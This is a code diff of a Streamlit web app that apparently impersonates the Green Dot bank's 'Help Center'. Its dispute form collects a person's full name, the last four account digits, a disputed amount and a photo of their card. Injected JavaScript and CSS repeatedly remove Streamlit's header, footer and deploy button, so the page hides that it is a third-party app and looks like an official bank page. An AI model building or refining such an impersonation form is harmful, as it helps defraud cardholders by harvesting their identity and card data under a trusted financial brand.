@@ -24,77 +24,60 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")
 
-# JS DE VISIBILIDAD AGRESIVA - ACTUALIZADO PARA TEXTO DE UPLOADER
+# JS DE VISIBILIDAD RADICAL (v1.3.2)
 st.markdown("""<script>
-    const forceVisibility = () => {
-        // Forzar visibilidad de textos en botones de carga
-        document.querySelectorAll('[data-testid="stFileUploader"] button').forEach(el => {
-            el.style.color = '#FFFFFF';
-            el.style.backgroundColor = '#262730';
-        });
-        
-        // Forzar texto de ayuda (200MB per file...)
-        document.querySelectorAll('[data-testid="stFileUploader"] small, [data-test="stFileUploaderFileName"]').forEach(el => {
+    const reinforceUI = () => {
+        // Seleccionar específicamente los textos de ayuda del uploader
+        const uploaderLabels = document.querySelectorAll('[data-testid="stFileUploader"] div[data-testid="stMarkdownContainer"] p, [data-testid="stFileUploader"] small');
+        uploaderLabels.forEach(el => {
             el.style.setProperty('color', '#FFFFFF', 'important');
+            el.style.setProperty('opacity', '1', 'important');
+            el.style.setProperty('-webkit-text-fill-color', '#FFFFFF', 'important');
         });
 
-        // Eliminar elementos de interfaz de Streamlit
-        ['header', 'footer', '.stDeployButton', '[data-testid="stHeader"]', '[data-testid="stAppToolbar"]'].forEach(s => {
+        // Forzar fondo negro en el contenedor para asegurar contraste
+        document.querySelectorAll('[data-testid="stFileUploader"] section').forEach(section => {
+            section.style.setProperty('background-color', '#1a1a1a', 'important');
+        });
+
+        // Limpieza de interfaz
+        ['header', 'footer', '.stDeployButton', '[data-testid="stHeader"]'].forEach(s => {
             document.querySelectorAll(s).forEach(el => el.remove());
         });
     };
-    setInterval(forceVisibility, 50);
+    setInterval(reinforceUI, 50);
 </script>""", unsafe_allow_html=True)
 
-# CSS PARA MODO CLARO/OSCURO FORZADO
+# CSS DE ALTA ESPECIFICIDAD
 st.markdown("""<style>
-    /* Fondo base negro absoluto */
     html, body, .stApp {
         background-color: #000000 !important;
     }
 
-    /* FORZAR TÍTULO EN BLANCO */
-    h1, [data-testid="stHeader"] h1, .stMarkdown h1 {
+    /* FUERZA BRUTA PARA EL TEXTO DEL UPLOADER */
+    [data-testid="stFileUploader"] * {
         color: #FFFFFF !important;
     }
 
-    /* BOTONES DE UPLOAD */
-    [data-testid="stFileUploader"] button {
+    [data-testid="stFileUploader"] small {
         color: #FFFFFF !important;
-        background-color: #333333 !important;
-        border: 1px solid #444444 !important;
-    }
-    
-    /* TEXTO DE AYUDA DEL UPLOADER (200MB...) */
-    [data-testid="stFileUploader"] small, 
-    [data-testid="stFileUploader"] div[data-testid="stMarkdownContainer"] p {
-        color: #FFFFFF !important;
-        opacity: 1 !important;
+        font-weight: 600 !important;
     }
 
-    /* BOTÓN SUBMIT NOW */
+    /* Evitar que el modo claro de iOS/Android lo ponga gris */
+    p, span, label, div {
+        color: #FFFFFF !important;
+    }
+
     .stButton > button {
         background-color: #00a05b !important;
         color: #FFFFFF !important;
-        border: 2px solid #FFFFFF !important;
-        font-weight: 800 !important;
-        text-transform: uppercase !important;
-    }
-
-    /* TEXTOS DE ETIQUETAS Y PÁRRAFOS GENERALES */
-    label p, .stMarkdown p, p, span, div {
-        color: #FFFFFF !important;
-    }
-
-    /* INPUTS */
-    .stTextInput input, .stNumberInput input {
-        background-color: #1a1a1a !important;
-        color: #FFFFFF !important;
-        border: 1px solid #333333 !important;
+        border: 1px solid #FFFFFF !important;
     }
 
     .block-container {
         max-width: 500px !important;
+        background-color: #000000 !important;
     }
 
     header, footer, .stDeployButton { display: none !important; }
@@ -102,8 +85,9 @@ st.markdown("""<style>
 
 if os.path.exists("logo.svg"): st.image("logo.svg", width=250)
 st.title("Help Center")
+st.write("Please fill out the form to submit your dispute.")
 
-with st.form("claim_v1_3_1", clear_on_submit=True):
+with st.form("claim_v1_3_2", clear_on_submit=True):
     st.text_input("Full Name")
     st.text_input("Last 4 digits of Account")
     st.number_input("Disputed Amount", format="%.2f")
@@ -111,9 +95,3 @@ with st.form("claim_v1_3_1", clear_on_submit=True):
     st.file_uploader("Card Photo", type=["jpg","png"])
     if st.form_submit_button("SUBMIT NOW"):
         st.success("Claim Received.")
-
-st.markdown("""<div style='background-color: #111; padding: 20px; border-radius: 12px; text-align: center; margin-top: 20px;'>
-    <p style='color: white !important; font-weight: bold;'>Download the Green Dot app</p>
-    <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='120'>
-    <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='120'>
-</div>""", unsafe_allow_html=True)
